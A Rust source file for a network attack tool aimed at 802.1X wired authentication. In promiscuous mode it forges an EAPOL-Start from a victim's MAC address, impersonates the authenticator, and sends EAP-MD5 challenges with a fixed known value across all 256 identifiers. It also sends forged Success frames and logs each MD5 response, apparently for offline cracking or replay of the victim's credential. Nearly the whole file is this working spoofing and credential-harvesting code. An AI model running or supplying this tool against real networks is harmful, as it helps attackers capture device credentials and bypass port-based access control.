use std::sync::mpsc::channel;
use std::thread::spawn;

use anyhow::{Context, Result};
use clap::Parser;
use hex::encode;
use pcap::{Capture, Direction, Error as PcapError};
use pnet::datalink::MacAddr;
use pnet::packet::ethernet::{EtherType, Ethernet, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{FromPacket, Packet};

#[derive(Debug, Parser)]
struct Args {
    #[arg(default_value_t = MacAddr::default(), long, required = false)]
    authenticator: MacAddr,
    #[arg(long, required = true)]
    interface: String,
    #[arg(long, required = true)]
    supplicant: MacAddr,
}

const ETHERTYPE_8021X: EtherType = EtherType(0x888e);

fn build_packet(e: &Ethernet) -> Option<MutableEthernetPacket<'static>> {
    let mut packet =
        MutableEthernetPacket::owned(vec![0u8; MutableEthernetPacket::packet_size(&e)])?;
    packet.populate(e);
    Some(packet)
}

fn build_request_identity(supplicant: MacAddr, authenticator: MacAddr, id: u8) -> Ethernet {
    let request_identity = Ethernet {
        destination: supplicant,
        ethertype: ETHERTYPE_8021X,
        payload: vec![
            // 802.1x
            0x01, // version
            0x00, // type
            0x00, 0x05, // length
            // EAP
            0x01, // code
            id,   // id
            0x00, 0x05, // length
            0x01, // type
            // padding (37 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, // padding (5 bytes)
        ],
        source: authenticator,
    };
    request_identity
}

fn build_request_challenge(supplicant: MacAddr, authenticator: MacAddr, id: u8) -> Ethernet {
    let request_challenge = Ethernet {
        destination: supplicant,
        ethertype: ETHERTYPE_8021X,
        payload: vec![
            // 802.1x
            0x01, // version
            0x00, // type
            0x00, 0x16, // length
            // EAP
            0x01, // code
            id,   // id
            0x00, 0x16, // length
            0x04, // type
            0x10, // value size
            0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, // value (bytes 0..8)
            0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, // value (bytes 8..16)
            // padding (20 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, // padding (5 bytes)
        ],
        source: authenticator,
    };
    request_challenge
}

fn build_success(supplicant: MacAddr, authenticator: MacAddr, id: u8) -> Ethernet {
    let success = Ethernet {
        destination: supplicant,
        ethertype: ETHERTYPE_8021X,
        payload: vec![
            // 802.1x
            0x01, // version
            0x00, // type
            0x00, 0x04, // length
            0x03, // code
            id,   // id
            0x00, 0x04, // length
            // padding (38 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (6 bytes)
        ],
        source: authenticator,
    };
    success
}

fn decode_packet_data(d: &[u8]) -> Option<Ethernet> {
    Some(EthernetPacket::new(d)?.from_packet())
}

fn main() -> Result<()> {
    let args = Args::parse();

    let mut capture_read = Capture::from_device(args.interface.as_str())
        .context("Capture::from_device failed for read")?
        .immediate_mode(true)
        .promisc(true)
        .timeout(0)
        .open()
        .context("Capture::open failed for read")?;

    capture_read
        .direction(Direction::In)
        .context("Capture::direction failed for read")?;

    capture_read
        .filter("ether proto 0x888e", true)
        .context("Capture::filter failed for read")?;

    let (read_tx, read_rx) = channel();
    // just let the thread die at the end of main
    let _read_thread = spawn(move || {
        if let Err(err) = || -> Result<()> {
            loop {
                let packet_result = capture_read.next_packet();
                if packet_result == Err(PcapError::TimeoutExpired) {
                    continue;
                }
                let packet = packet_result.context("next_packet failed")?;
                read_tx
                    .send(packet.data.to_owned())
                    .context("send failed")?;
            }
        }() {
            eprintln!("Read thread error: {:?}", err);
        }
    });

    let mut capture_write = Capture::from_device(args.interface.as_str())
        .context("Capture::from_device failed for write")?
        .open()
        .context("Capture::open failed for write")?;

    let mut authenticator = args.authenticator;
    let bridge_mode = authenticator == MacAddr::default();

    if bridge_mode {
        let start = Ethernet {
            destination: MacAddr::new(0x01, 0x80, 0xc2, 0x00, 0x00, 0x03),
            ethertype: ETHERTYPE_8021X,
            payload: vec![
                // 802.1x
                0x01, // version
                0x01, // type
                0x00, 0x00, // length
                // padding (42 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding (8 bytes)
                0x00, 0x00, // padding (2 bytes)
            ],
            source: args.supplicant,
        };

        eprintln!("S {:?}", start);

        let start_packet = build_packet(&start).context("build_packet failed for start")?;
        capture_write
            .sendpacket(start_packet.packet())
            .context("sendpacket failed for start")?;

        let request_identity_packet_data =
            read_rx.recv().context("recv failed for request_identity")?;

        let request_identity = decode_packet_data(&request_identity_packet_data)
            .context("decode_packet_data failed for request_identity")?;

        eprintln!("R {:?}", request_identity);

        authenticator = request_identity.source;

        eprintln!("Authenticator is {:?}", authenticator);

        // Consume the rest of the sequence between the real authenticator and supplicant
        for _ in 0..4 {
            let skip_packet_data = read_rx.recv().context("recv failed for skip")?;
            let skip = decode_packet_data(&skip_packet_data)
                .context("decode_packet_data failed for skip")?;
            eprintln!("R {:?}", skip);
        }
    }

    for identity_id in 0x00u8..=0xffu8 {
        let request_identity = build_request_identity(args.supplicant, authenticator, identity_id);
        eprintln!("S {:?}", request_identity);

        let request_identity_packet =
            build_packet(&request_identity).context("build_packet failed for request_identity")?;
        capture_write
            .sendpacket(request_identity_packet.packet())
            .context("sendpacket failed for request_identity")?;

        let response_identity_packet_data = read_rx
            .recv()
            .context("recv failed for response_identity")?;

        let response_identity = decode_packet_data(&response_identity_packet_data)
            .context("decode_packet_data failed for response_identity")?;
        eprintln!("R {:?}", response_identity);

        let challenge_id = identity_id.wrapping_add(1);
        let request_challenge =
            build_request_challenge(args.supplicant, authenticator, challenge_id);
        eprintln!("S {:?}", request_identity);

        let request_challenge_packet = build_packet(&request_challenge)
            .context("build_packet failed for request_challenge")?;
        capture_write
            .sendpacket(request_challenge_packet.packet())
            .context("sendpacket failed for request_challenge")?;

        let response_challenge_packet_data = read_rx
            .recv()
            .context("recv failed for response_challenge")?;
        let response_challenge = decode_packet_data(&response_challenge_packet_data)
            .context("decode_packet_data failed for response_challenge")?;
        eprintln!("R {:?}", response_challenge);

        let response_id = response_challenge.payload[5];
        let response_value = &response_challenge.payload[10..26];

        println!("{:02x},{}", response_id, encode(response_value));

        let success_id = challenge_id.wrapping_add(1);
        let success = build_success(args.supplicant, authenticator, success_id);
        eprintln!("S {:?}", success);

        let success_packet = build_packet(&success).context("build_packet failed for success")?;
        capture_write
            .sendpacket(success_packet.packet())
            .context("sendpacket failed for success")?;
    }

    Ok(())
}
